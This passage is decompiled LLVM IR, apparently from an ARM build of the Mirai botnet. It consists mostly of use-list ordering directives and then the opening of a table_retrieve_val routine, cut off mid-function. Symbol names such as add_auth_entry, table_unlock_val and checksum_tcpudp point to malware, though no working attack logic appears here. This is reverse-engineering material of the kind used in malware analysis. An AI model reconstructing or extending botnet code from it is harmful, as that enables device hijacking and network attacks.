  uselistorder i32 %v1_e3c8, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e3d4, { 0, 3, 2, 1 }
  uselistorder i32 %v0_e384, { 2, 3, 4, 1, 0, 5, 7, 6 }
  uselistorder i32 %v5_e378, { 2, 1, 0 }
  uselistorder i32 %v1_e358, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_e33c, { 0, 1, 3, 2 }
  uselistorder i1 %v2_e334, { 1, 0 }
  uselistorder i1 %v9_e300, { 1, 0 }
  uselistorder i32 %v0_e2b0, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_e254, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_e204, { 1, 0 }
  uselistorder i32 %v5_e19c, { 1, 0 }
  uselistorder i32 %v5_e15c, { 0, 3, 1, 2 }
  uselistorder i1 %v2_e0e4, { 1, 0 }
  uselistorder i1 %v3_e0c8, { 1, 0, 2 }
  uselistorder i1 %v2_e0b4, { 1, 0 }
  uselistorder i1 %v2_e090, { 1, 0 }
  uselistorder i32 %v1_e040, { 14, 13, 12, 11, 15, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_e02c, { 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 20, 21, 22, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_e028, { 4, 5, 6, 0, 7, 1, 2, 3, 8 }
  uselistorder i32 %v0_e010, { 1, 0 }
  uselistorder i32 %v0_dfe8, { 1, 0 }
  uselistorder i32 %stack_var_-1880.0, { 0, 1, 2, 3, 4, 5, 7, 9, 12, 11, 6, 8, 10, 14, 13 }
  uselistorder i16 %v5_d320.le, { 0, 2, 1 }
  uselistorder i32 %v0_d304, { 3, 2, 0, 1 }
  uselistorder i1 %v7_d2a4, { 1, 0 }
  uselistorder i32 %v3_d29c, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %v0_d288, { 1, 0 }
  uselistorder i32 %v0_d258, { 1, 0 }
  uselistorder i32 %storemerge308, { 1, 0 }
  uselistorder i32 %v0_cf08, { 3, 1, 2, 0, 4 }
  uselistorder i16* %stack_var_-52, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0, 2 }
  uselistorder i32* %stack_var_-96, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-224, { 1, 0 }
  uselistorder i32* %stack_var_-352, { 1, 0 }
  uselistorder i8* %stack_var_-56, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-60, { 6, 7, 8, 0, 9, 1, 10, 4, 11, 2, 12, 3, 13, 5, 14 }
  uselistorder i32* %stack_var_-42, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 62, 63, 64, 65, 66, 67, 68, 73, 74, 69, 75, 76, 77, 78, 79, 81, 80, 82, 83, 84, 85, 23, 86, 0, 70, 71, 24, 25, 26, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 72, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 110, 111, 113, 112, 109, 114, 154, 155, 115, 116, 156, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 157, 133, 134, 135, 136, 138, 137, 140, 139, 153, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152 }
  uselistorder i32* %r2.global-to-local, { 36, 37, 38, 39, 40, 41, 42, 50, 43, 44, 45, 51, 52, 53, 54, 10, 0, 46, 47, 11, 12, 1, 2, 3, 4, 5, 6, 7, 8, 9, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 48, 49, 112, 116, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 107, 109, 67, 68, 70, 69, 66, 292, 71, 293, 72, 294, 295, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 291, 110, 108, 111, 113, 114, 115, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290 }
  uselistorder i32* %r1.global-to-local, { 39, 40, 41, 42, 43, 44, 45, 54, 46, 47, 48, 49, 55, 56, 57, 8, 1, 2, 50, 51, 9, 10, 0, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 199, 200, 52, 53, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 92, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 277, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276 }
  uselistorder i32* %r0.global-to-local, {}
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 21, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i1* %cpsr_z.global-to-local, { 130, 108, 109, 125, 126, 131, 132, 144, 216, 211, 31, 32, 34, 110, 220, 112, 114, 115, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 120, 113, 19, 20, 25, 21, 22, 23, 24, 26, 27, 28, 29, 30, 33, 111, 35, 41, 36, 37, 38, 39, 40, 42, 43, 44, 45, 46, 47, 51, 52, 53, 48, 49, 50, 54, 55, 56, 57, 58, 59, 63, 64, 65, 60, 61, 62, 66, 67, 68, 69, 70, 71, 75, 76, 77, 72, 73, 74, 78, 79, 80, 81, 82, 83, 87, 88, 89, 84, 85, 86, 90, 91, 92, 93, 94, 95, 99, 100, 101, 96, 97, 98, 102, 103, 104, 105, 106, 107, 116, 117, 118, 119, 133, 135, 134, 136, 137, 138, 139, 140, 141, 142, 143, 121, 122, 145, 146, 147, 148, 150, 149, 151, 152, 153, 156, 158, 159, 157, 154, 155, 127, 128, 123, 160, 124, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 219, 193, 194, 195, 196, 197, 218, 198, 199, 200, 217, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 212, 213, 214, 129, 215 }
  uselistorder i1* %cpsr_c.global-to-local, { 126, 106, 107, 127, 121, 122, 128, 140, 0, 204, 29, 30, 32, 108, 212, 109, 111, 112, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 117, 110, 17, 18, 23, 19, 20, 21, 22, 24, 25, 26, 27, 28, 31, 213, 33, 39, 34, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 49, 50, 51, 46, 47, 48, 52, 53, 54, 55, 56, 57, 61, 62, 63, 58, 59, 60, 64, 65, 66, 67, 68, 69, 73, 74, 75, 70, 71, 72, 76, 77, 78, 79, 80, 81, 85, 86, 87, 82, 83, 84, 88, 89, 90, 91, 92, 93, 97, 98, 99, 94, 95, 96, 100, 101, 102, 103, 104, 105, 113, 114, 115, 129, 131, 130, 132, 133, 134, 135, 136, 137, 138, 139, 116, 118, 141, 142, 143, 144, 145, 146, 147, 150, 152, 153, 151, 148, 149, 123, 124, 119, 154, 120, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 211, 185, 186, 187, 188, 189, 210, 190, 191, 192, 209, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 205, 206, 207, 125, 208 }
  uselistorder i32 ptrtoint (i16** @global_var_23a50.70 to i32), { 3, 0, 1, 2 }
  uselistorder i16** @global_var_20f80.125, { 1, 0 }
  uselistorder i16* bitcast (i16** @global_var_20f80.125 to i16*), { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i8 31, { 6, 0, 1, 2, 3, 7, 4, 5 }
  uselistorder i8 30, { 4, 0, 1, 5, 2, 3 }
  uselistorder i32 251, { 3, 4, 5, 0, 1, 2 }
  uselistorder i8 -3, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i8 -4, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_186ec.498 to i32), { 5, 7, 6, 8, 0, 9, 3, 10, 1, 11, 2, 12, 4, 13 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 11, 10, 9, 8, 7, 6, 5, 27, 23, 22, 26, 25, 24, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 4, 3, 2, 1, 0 }
  uselistorder i8 37, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11 }
  uselistorder i8 34, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13 }
  uselistorder i8 36, { 4, 5, 0, 1, 2, 3, 6, 7, 8, 9, 18, 19, 20, 21, 10, 11, 12, 13, 14, 15, 16, 17, 22, 23, 24, 25 }
  uselistorder i8 35, { 4, 5, 6, 7, 0, 1, 2, 3, 8, 9, 10, 11, 20, 21, 22, 23, 12, 13, 14, 15, 16, 17, 18, 19, 24, 25, 26, 27 }
  uselistorder i8 58, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13 }
  uselistorder i8 57, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13 }
  uselistorder i8 62, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13 }
  uselistorder i8 61, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13 }
  uselistorder i32 (i32)* @table_lock_val, { 9, 18, 17, 8, 19, 16, 15, 14, 13, 12, 11, 10, 7, 0, 5, 4, 3, 6, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @util_memsearch, { 3, 1, 4, 2, 0 }
  uselistorder i32 (i32, i32*)* @table_retrieve_val, { 8, 9, 0, 1, 2, 3, 4, 5, 6, 7, 10, 18, 12, 13, 14, 11, 15, 16, 17 }
  uselistorder i32 (i32)* @table_unlock_val, { 10, 9, 18, 17, 16, 15, 14, 13, 12, 11, 8, 0, 6, 5, 4, 7, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 1, 0 }
  uselistorder i32 ()* @setup_connection, { 2, 1, 0 }
  uselistorder i32 254, { 3, 4, 5, 0, 1, 2 }
  uselistorder i8 5, { 11, 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 8, 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @checksum_tcpudp, { 8, 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i16 4873, { 1, 0 }
  uselistorder i32 4873, { 1, 0 }
  uselistorder i32 (i32, i32)* @checksum_generic, { 10, 9, 8, 7, 0, 6, 1, 5, 4, 3, 2 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 223, { 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_186d8.480 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_185b0.430 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_18578.418 to i32), { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1853c.402 to i32), { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1851c.394 to i32), { 2, 0, 3, 4, 1, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_18514.392 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_184dc.376 to i32), { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_184cc.372 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_184c4.370 to i32), { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_184a8.362 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_18420.334 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_18418.332 to i32), { 2, 0, 3, 4, 1, 5 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_18410.328 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_183ec.320 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_183dc.316 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_183b0.306 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_183a0.302 to i32), { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_18398.300 to i32), { 1, 4, 2, 0, 3, 5 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_18364.286 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_18340.276 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_182e0.254 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1814c.244 to i32), { 0, 5, 1, 2, 3, 6, 4, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_18264.226 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_18210.208 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_181f0.202 to i32), { 0, 6, 1, 7, 2, 3, 4, 8, 5, 9 }
  uselistorder i32 ptrtoint ([11 x i8]* @global_var_181e4.200 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_181dc.198 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_181d4.196 to i32), { 1, 3, 0, 4, 2, 5 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_181c8.192 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_181b8.190 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_181a8.186 to i32), { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_182e4.182 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_18188.178 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_18180.176 to i32), { 1, 7, 2, 8, 0, 9, 3, 4, 5, 10, 6, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_18178.174 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1816c.172 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_18570.170 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_18164.168 to i32), { 0, 7, 1, 8, 2, 9, 3, 10, 4, 5, 6, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_1815c.166 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_18154.164 to i32), { 0, 6, 3, 7, 1, 8, 2, 9, 4, 10, 5, 11 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_18140.160 to i32), { 0, 6, 1, 7, 2, 3, 4, 8, 5, 9 }
  uselistorder i32 ptrtoint (i32* @global_var_18130.156 to i32), { 2, 0, 3, 4, 1, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_18638.150 to i32), { 7, 46, 8, 47, 9, 48, 10, 49, 0, 50, 11, 51, 12, 52, 13, 53, 1, 54, 2, 55, 3, 56, 14, 57, 4, 58, 15, 59, 5, 60, 16, 61, 17, 62, 18, 63, 6, 64, 19, 65, 20, 66, 21, 67, 22, 68, 23, 69, 24, 70, 25, 71, 26, 72, 27, 73, 28, 74, 29, 75, 30, 76, 31, 77, 32, 78, 33, 79, 34, 80, 35, 81, 36, 82, 37, 83, 38, 84, 39, 85, 40, 86, 41, 42, 43, 87, 44, 88, 45, 89 }
  uselistorder i32 (i32, i32, i32)* @add_auth_entry, { 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 0, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_18494.148 to i32), { 6, 56, 7, 57, 8, 58, 9, 59, 0, 60, 10, 61, 1, 62, 11, 63, 2, 64, 12, 65, 13, 66, 14, 67, 3, 68, 15, 69, 16, 70, 17, 71, 18, 72, 19, 73, 20, 74, 4, 75, 21, 76, 22, 77, 23, 78, 24, 79, 25, 80, 26, 81, 27, 82, 28, 83, 29, 84, 30, 85, 31, 86, 32, 87, 33, 88, 34, 89, 35, 90, 36, 91, 37, 92, 38, 93, 39, 94, 40, 95, 41, 96, 42, 97, 43, 98, 44, 45, 46, 99, 47, 100, 48, 101, 49, 102, 50, 103, 51, 104, 5, 105, 52, 106, 53, 107, 54, 108, 55, 109 }
  uselistorder i32 ptrtoint (i32* @global_var_185f0.146 to i32), { 4, 16, 5, 17, 6, 18, 0, 19, 1, 20, 7, 21, 2, 22, 8, 23, 9, 24, 10, 25, 11, 26, 12, 27, 13, 28, 14, 29, 15, 30, 3, 31 }
  uselistorder i8* @global_var_20f75.143, { 1, 0 }
  uselistorder i16* @global_var_20f6a.142, { 1, 0 }
  uselistorder i16 5888, { 1, 0, 2 }
  uselistorder i8 6, { 2, 0, 3, 4, 5, 6, 1 }
  uselistorder i8 16, { 0, 1, 2, 4, 3, 12, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_20f68.137 to i32), { 1, 2, 0, 3, 4 }
  uselistorder i8* @global_var_20f74.138, { 1, 0 }
  uselistorder i32 10240, { 1, 0, 2 }
  uselistorder i8** @global_var_20f54.134, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_20f54.134 to i32), { 2, 10, 3, 1, 0, 9, 4, 8, 7, 6, 5 }
  uselistorder i32 1023, { 2, 0, 1 }
  uselistorder i32 ()* @rand_next, { 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 7, 6, 5, 4, 3, 2, 1, 0, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 9, 8, 7, 6, 5, 4, 3, 0, 2, 1 }
  uselistorder i32* @global_var_23a64.132, { 1, 2, 3, 4, 0, 5 }
  uselistorder i16 254, { 1, 2, 0 }
  uselistorder i32* @global_var_23a60.130, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 288, { 2, 3, 7, 0, 1, 4, 5, 6, 8 }
  uselistorder i32* @global_var_20f84.119, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder i32 (i32*)* @__GI_time, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 21, 22, 10, 11, 12, 13, 18, 19, 20, 14, 15, 16, 17 }
  uselistorder i32 (i32)* @rand_init, { 1, 0 }
  uselistorder i32* @global_var_23a4c.55, { 3, 4, 0, 1, 2, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i32 ptrtoint (i32* @global_var_23a4c.55 to i32), { 1, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder i32 ()* @util_local_addr, { 2, 1, 0 }
  uselistorder i32* @global_var_23a68.117, { 0, 2, 1 }
  uselistorder i32 ()* @__libc_fork, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_f340, { 1, 0 }
  uselistorder label %bb426, { 1, 0 }
  uselistorder label %dec_label_pc_f25c, { 1, 0 }
  uselistorder label %dec_label_pc_e618.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e618.backedge.thread526, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_e618.backedge.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_f000, { 1, 0 }
  uselistorder label %dec_label_pc_ef38, { 1, 0 }
  uselistorder label %dec_label_pc_ef34, { 1, 2, 3, 4, 0, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_ef2c, { 1, 2, 3, 0, 4, 6, 7, 5 }
  uselistorder label %dec_label_pc_ef1c, { 1, 0 }
  uselistorder label %dec_label_pc_eeac, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %.thread114, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ee78, { 1, 0 }
  uselistorder label %.thread110, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ee58, { 1, 0 }
  uselistorder label %dec_label_pc_ee44, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_ee00, { 1, 0 }
  uselistorder label %dec_label_pc_ee00.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_ede0, { 5, 3, 4, 1, 0, 6, 2 }
  uselistorder label %dec_label_pc_edac, { 1, 0 }
  uselistorder label %thread-pre-split103, { 1, 0 }
  uselistorder label %dec_label_pc_ed5c, { 1, 0 }
  uselistorder label %dec_label_pc_ec74, { 1, 0 }
  uselistorder label %dec_label_pc_eba8, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_eb90, { 1, 0 }
  uselistorder label %dec_label_pc_ead4, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_eabc, { 1, 0 }
  uselistorder label %dec_label_pc_ea00, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_e9e8, { 1, 0 }
  uselistorder label %dec_label_pc_e92c, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_e914, { 1, 0 }
  uselistorder label %dec_label_pc_e858, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_e840, { 1, 0 }
  uselistorder label %dec_label_pc_e720, { 6, 1, 7, 3, 0, 2, 4, 5 }
  uselistorder label %bb388, { 1, 0 }
  uselistorder label %bb386, { 1, 0 }
  uselistorder label %dec_label_pc_e6e4, { 1, 0 }
  uselistorder label %dec_label_pc_e67c, { 1, 0 }
  uselistorder label %.thread63, { 1, 0 }
  uselistorder label %dec_label_pc_e630, { 1, 0 }
  uselistorder label %dec_label_pc_e620, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_e620.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_e5f8, { 1, 0 }
  uselistorder label %dec_label_pc_e550, { 1, 0 }
  uselistorder label %bb382, { 1, 0 }
  uselistorder label %bb380, { 1, 0 }
  uselistorder label %bb378, { 1, 0 }
  uselistorder label %bb376, { 3, 4, 0, 1, 2, 6, 5 }
  uselistorder label %dec_label_pc_e444.dec_label_pc_e444_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_e424.dec_label_pc_e424_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_e418, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_e410, { 1, 0 }
  uselistorder label %dec_label_pc_e3ec, { 1, 0 }
  uselistorder label %dec_label_pc_e3c8, { 1, 0 }
  uselistorder label %dec_label_pc_e27c, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_e268, { 1, 0 }
  uselistorder label %.thread39, { 1, 0 }
  uselistorder label %dec_label_pc_e0f4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e0d0, { 1, 0 }
  uselistorder label %dec_label_pc_e0c4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e0a0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e07c, { 1, 0 }
  uselistorder label %bb350, { 1, 0 }
  uselistorder label %dec_label_pc_e028, { 22, 6, 7, 2, 8, 3, 9, 4, 10, 5, 11, 0, 12, 13, 14, 15, 16, 17, 18, 19, 1, 20, 21, 23 }
  uselistorder label %dec_label_pc_d304, { 1, 0 }
}

define i32 @table_retrieve_val(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_23a70.509 to i32), i32* @r2, align 4
  %v3_f34c = mul i32 %arg1, 8
  %v2_f350 = add i32 %v3_f34c, ptrtoint (i32* @global_var_23a70.509 to i32)
  store i32 %v2_f350, i32* @r3, align 4
  %v2_f354 = icmp eq i32* %arg2, null
  br i1 %v2_f354, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_f35c4 = inttoptr i32 %v2_f350 to i32*
  %v4_f35c5 = load i32, i32* %v3_f35c4, align 4
  br label %bb7

bb:                                               ; preds = %entry
  %v2_f358 = add i32 %v3_f34c, add (i32 ptrtoint (i32* @global_var_23a70.509 to i32), i32 4)
  %v3_f358 = inttoptr i32 %v2_f358 to i16*
  %v4_f358 = load i16, i16* %v3_f358, align 4
  %v5_f358 = zext i16 %v4_f358 to i32
  store i32 %v5_f358, i32* @r3, align 4
  %v3_f35c = inttoptr i32 %v2_f350 to i32*
